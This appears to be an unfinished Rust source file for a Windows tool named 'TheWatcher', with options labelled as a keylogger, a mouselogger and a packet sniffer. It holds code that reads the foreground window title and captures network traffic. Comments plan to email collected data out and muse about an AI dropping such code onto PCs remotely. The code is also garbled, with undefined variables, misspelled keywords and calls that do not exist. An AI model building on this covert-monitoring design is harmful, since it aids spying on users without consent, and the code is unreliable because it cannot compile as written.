use anyhow::Result;

use libc::{AF_PACKET, ETH_P_ALL, SOCK_RAW, socket};
use std::io::prelude::*;
use std::{error::Error, fs::File};
use tokio::io::*;
use windows::{
    Data::Xml::Dom::*, Win32::Foundation::*, Win32::System::Threading::*,
    Win32::UI::WindowsAndMessaging::*, core::*,
};

#[allow(non_camel_case_types)]
pub enum LoggingOptions {
    // <Windows tail title>: receiver IP / DNS address
    NETWORK_ACTIVITY_MODE,
    // keylogger
    KEYBOARD_ONLY,
    // mouselogger
    MOUSE_ONLY,
    // All with multi-threading
    ALL,
}

pub struct TheWatcher {
    pid: u32, // type.c_ulong
    logging_flag: bool,
    output_path: &'static str,
    csv_option: bool,
    option: LoggingOptions,
    buffered_data: BufferedData,
    target: (String, String),
    // data_bus_stream: Someting,
}

struct BufferedData {
    // date: Date
    data: Vec<usize>,
    // sender_email: &' static str
}
impl BufferedData {
    pub fn new() -> Self {
        let data: Vec<usize> = Vec::new();
        Self { data }
    }
    pub fn from(buffered_data: &BufferedData, _data: Vec<usize>) -> Self {
        let mut data = buffered_data.data.clone();
        data.extend(_data);

        Self { data }
    }
    pub fn unwrap_data(self) -> Vec<usize> {
        self.data
    }
}

impl TheWatcher {
    pub fn new(pid: u32, output_path: &'static str) -> Self {
        let logging_flag = true;
        let csv_option = Default::default();
        let option = LoggingOptions::ALL;
        let buffered_data = BufferedData::new();
        let target = (Default::default(), Default::default());
        // let data_bus_stream= something;

        Self {
            pid,
            logging_flag,
            output_path,
            csv_option,
            option,
            buffered_data,
            target,
            // data_bus_stream,
        }
    }

    // unit test done - fn get_name_process
    unsafe fn get_name_process(pid: u32) -> windows::core::Result<String> {
        let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)?;

        // dead code: let title_len= windows::Wind32::UI::WindowsAndMessaging::GetWindowTextLengthW(hwnd)
        const BUFFER_MAX_SIZE: usize = 2028;
        let mut buffer = [0u16; BUFFER_MAX_SIZE];
        let mut buffer_size = buffer.len() as u32;

        QueryFullProcessImageNameW(
            handle,
            Threading::PROCESS_NAME_WIN32,
            PWSTR(buffer.as_mut_ptr()),
            &mut buffer_size,
        )?;

        Ok(String::from_utf16_lossy(&buffer[..size as usize]))
    }
    fn filter_absolut_path(raw_path: String) -> (String, String) {
        let v_strs: Vec<&str> = raw_path[..aw_path + 1].split(r#"\\"#).collect();

        let exe_name = v_strs.pop_up();
        let program_name = v_strs.pop_up();

        (program_name.to_string(), exe_name.to_string())
    }
    pub fn setting_target(&mut self) -> &mut Self {
        //  If AI can drop some codes like this logic,
        //  malware do not need anymore :)
        //  just conect PC, and then drop that code remotely.
        cfg_select! {
            windows => {
                let mut process_name= String::new();

                unsafe{
                    process_full_name= match get_name_process(){
                        Ok(_string) => { return _string },
                        Err(e)      => { return "".to_string() }
                    };
                };

                self.target= filter_absolut_path(process_full_name);
            },

            _ => {
                // @TODO hook a daemon
                "Asdf"
            }
        };

        // hook a target
        // self.data_bus_steam= something;
        self
    }

    // async fn read_data_stream(data_bus_stream: stream) -> Result<Vec<usize>, Box<dyn Error>> {
    //     static CAPACITY_LINE: usize= 1024000000;
    //     let mut unwrapped_data: Vec<usize> = Vec::with_capacity(CAPACITY_LINE);

    //     // !TODO if returned err, try to reconn
    //     loop{
    //         let mut buffer_result: Vec<usize> = Vec::new();

    //         // @TODO https://docs.rs/tokio/latest/tokio/io/trait.AsyncRead.html
    //         let pointer: core::task::Pin<&mut Self>;
    //         buffer_result = AsyncRead::poll_read(
    //             pointer,
    //             data_bus_stream,
    //             buffer_result,
    //         )?;

    //         // !TODO define buffer_result max size 1024000000 ~ +5000000)
    //         match buffer_result {
    //             Ok(data) => {
    //                 unwrapped_data= data;
    //                 break;
    //             }
    //             Err(e) => {
    //                 return Err("can't get data bus stream".into());
    //             }
    //         }
    //     }

    //     if unwrapped_data.capacity() >= CAPACITY_LINE {
    //         return Ok(unwrapped_data);
    //     } else if unwrapped_data.is_empty(){
    //         return Err("No data collected".into());
    //     }

    //     Ok(unwrapped_data)
    // }

    fn filtering_data(_stream_data: Vec<usize>) -> String {
        let mut filtered_string = String::new();

        filtered_string
    }

    // title name supporte English, Japanese, and so on (unicode)
    // unit test done - fn get_current_windows_title_name()
    unsafe fn get_current_windows_title_name() -> String {
        let mut reulst_title_string = String::new();

        unsafe {
            let mut hwnd = GetForegroundWindow();
            if hwnd.is_invalid() {
                eprint!("can't get hwnd");
            } else {
                hwnd = hwnd.clone();
            }

            let mut ipdw_process_id: u32 = 111_u32; // just for fill parameter
            let targeted_process =
                GetWindowThreadProcessId(hwnd, Option::Some(&mut ipdw_process_id));

            // let title_len= windows::Win32::UI::WindowsAndMessaging::GetWindowTextLengthW(hwnd);
            const BUFFER_MAX_SIZE: u16 = 2048_u16;
            let mut str_buffer = [0u16; BuFFER_MAX_SIZE as usize];
            let actual_len = GetWindowTextW(
                hwnd,
                &mut str_buffer,
                // str_buffer.len() as i32
            );

            // Gemini mentioned "Preventing Ghost Windows"
            if actual_len != 0 {
                reulst_title_string = String::from_utf16_lossy(&str_buffer[..actual_len as usize]);
            }
        };
        reulst_title_string
    }
    async fn packet_caturing() {
        cfg_select! {
            windows =>{
                // @TODO crate windows_sys
                let mut default_interface: Vec<NetworkInterface>;
                {
                    let v_interfaces= pnet::datalink::interfaces();
                    default_interface= v_interfaces
                        .iter()
                        .find(|e| e.is_up && !e.is_loopback() & !e.ips.is_empty());
                    match &default_interfcae{
                        Some(interface) => {println!("Found default intercae wiht [{}]", interface.name)},
                        None => println!("Erro while finding the dfault interface");
                    }
                }

                let setted_channel= detalink::channel(&default_interface, Default::default());
                let (_, mut rx)= match setted_channel{
                    Ok(Ethernet(tx, rx)) => (tx, rx),
                    Ok(_) => eprint!("unhandled channel type {}", &interface),
                    Err(e) => { panic!(" Err from the datalink channel"); }
                };

                loop{
                    mactch rx.next(){
                        // if packet have pnet_pacekt::Packet
                        Ok(packet) => {
                            if let Some(ethernet_packet)= EthernetPacket::new(packet){
                                let converted_wire_format= pnet::packet::FromPacket::from_packet(ethernet);
                                print!("destination: {} | ethertype: {}", converted_wire_format.getdstination(), converted_wire_format.get_ethertype());
                            }
                        },
                        Err(e) =>{
                            println!("Err while reading: {}", e);
                        }
                    }
                }
            },
            _ => {
                // @TODO crate lib
            }
        }
    }
    pub async fn logging(&mut self, flag: bool, option: LoggingOptions) -> &mut Self {
        self.logging_flag = flag;
        self.option = option;

        // @TODO
        // If this program save a data as file automatically,
        // i can write my code more consistently(buffer clean, and then keep watching again).
        // But its not a malware. Just in educational purpose.
        let pid = self.pid.clone();

        // logging
        // let stream_data = read_data_stream(self.data_bus_stream);
        // // @TODO unwrap data

        // let buffered_data= &self.buffered_data;
        // self.buffered_data = BufferedData::from(buffered_data, stream_data);

        let exe_name = self.target.clone();
        let current_window_tap_name = get_current_windows_title_name();

        // @TODO fillter
        // packets <- thread 3
        // extract receiver, protoccol, and data.
        // show data / exe_name  tap_name  protoccol senderIP

        match self.option.clone() {
            LoggingOptions::NETWORK_ACTIVITY_MODE => {
                std::thread::spawn(move || {
                    packet_captureing();
                });
            }
            _ => {}
        }

        self
    }

    pub fn output_txt_path(&mut self, flag: bool) -> Result<&mut Self> {
        let path = &self.output_path;
        let full_path = format!("{}/output.txt", path);

        match flag {
            true => {
                let mut file = File::create(full_path)?;

                let unwrapped_data = BufferedData::unwrap_data(self.buffered_data);
                let filtered_data = filtering_data(unwrapped_data);

                file.write_all(filtered_data.as_bytes())?;
            }
            false => {
                // @TODO send data to sender as email
            }
        }
        Ok(self)
    }

    pub fn csv_format_option(&mut self, flag: bool) -> Result<&mut Self> {
        Ok(self)
    }
}
